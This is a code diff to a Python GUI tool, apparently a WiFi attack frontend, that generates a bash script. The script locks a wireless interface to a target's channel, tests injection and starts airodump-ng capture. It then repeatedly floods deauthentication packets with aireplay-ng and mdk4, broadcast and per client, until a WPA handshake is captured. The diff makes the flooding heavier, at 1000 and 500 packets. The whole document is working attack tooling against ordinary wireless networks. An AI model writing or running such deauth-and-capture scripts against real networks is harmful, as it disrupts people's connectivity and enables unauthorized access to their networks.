@@ -1364,30 +1364,43 @@ class MaximWindow(QMainWindow):
         script.write("}\n")
         script.write("trap cleanup EXIT INT TERM\n\n")
 
+        # Lock channel explicitly
+        script.write(f"sudo iwconfig {iface} channel $CHANNEL 2>/dev/null\n")
+        script.write(f"sudo iw dev {iface} set channel $CHANNEL 2>/dev/null\n\n")
+
+        # Show what we're about to do
+        script.write(f"echo 'Interface: {iface}'\n")
+        script.write("echo \"Target: $BSSID on channel $CHANNEL\"\n")
+        script.write(f"echo 'Mode:' $(iw dev {iface} info 2>/dev/null | grep type | awk '{{print $2}}')\n\n")
+
+        # Quick injection test
+        script.write("echo 'Testing injection...'\n")
+        script.write(f"sudo aireplay-ng --test -a $BSSID {iface} 2>&1\n")
+        script.write("echo\n\n")
+
         # Start airodump in background
         script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w \"$CAPTURE_DIR/{safe_essid}\" --output-format pcap,csv {iface} &>/dev/null &\n")
         script.write("AIRODUMP_PID=$!\n")
         script.write("sleep 3\n\n")
 
-        # Aggressive deauth — runs until handshake captured
+        # FULL VISIBLE deauth — no tail, no hiding, see EVERYTHING
         script.write("HANDSHAKE_GOT=''\n")
-        script.write("echo 'Executing Deauth...'\n")
-        script.write("ROUND=0\n")
+        script.write("echo 'Executing Deauth — FULL OUTPUT'\n")
+        script.write("echo '══════════════════════════════════════════════════════════'\n\n")
         script.write("while true; do\n")
-        script.write("  ROUND=$((ROUND+1))\n")
-        # Broadcast deauth — 500 packets, visible
-        script.write(f"  sudo aireplay-ng --deauth 500 -a $BSSID {iface} 2>&1 | tail -3\n")
-        # Per-client targeted deauth
+        # Broadcast deauth — FULL output, 1000 packets
+        script.write(f"  sudo aireplay-ng --deauth 1000 -a $BSSID {iface}\n")
+        # Per-client
         script.write(f"  CAP_CSV=$(ls -t \"$CAPTURE_DIR/{safe_essid}\"-*.csv 2>/dev/null | head -1)\n")
         script.write("  if [ -n \"$CAP_CSV\" ]; then\n")
         script.write("    for STA in $(grep -E '^[0-9A-Fa-f]{2}:' \"$CAP_CSV\" | grep -v \"^$BSSID\" | grep -i \"$BSSID\" | cut -d, -f1 | tr -d ' ' | sort -u); do\n")
-        script.write(f"      sudo aireplay-ng --deauth 200 -a $BSSID -c $STA {iface} 2>&1 | tail -2\n")
+        script.write(f"      sudo aireplay-ng --deauth 500 -a $BSSID -c $STA {iface}\n")
         script.write("    done\n")
         script.write("  fi\n")
-        # mdk4 deauth blast
+        # mdk4
         script.write("  if command -v mdk4 >/dev/null 2>&1; then\n")
         script.write("    echo $BSSID > /tmp/maxim_mdk_target\n")
-        script.write(f"    sudo timeout 10 mdk4 {iface} d -B /tmp/maxim_mdk_target -c $CHANNEL 2>&1 | tail -2\n")
+        script.write(f"    sudo timeout 15 mdk4 {iface} d -B /tmp/maxim_mdk_target -c $CHANNEL\n")
         script.write("  fi\n")
         # Check handshake
         script.write(f"  CAP_FILE=$(ls -t \"$CAPTURE_DIR/{safe_essid}\"-*.cap 2>/dev/null | head -1)\n")
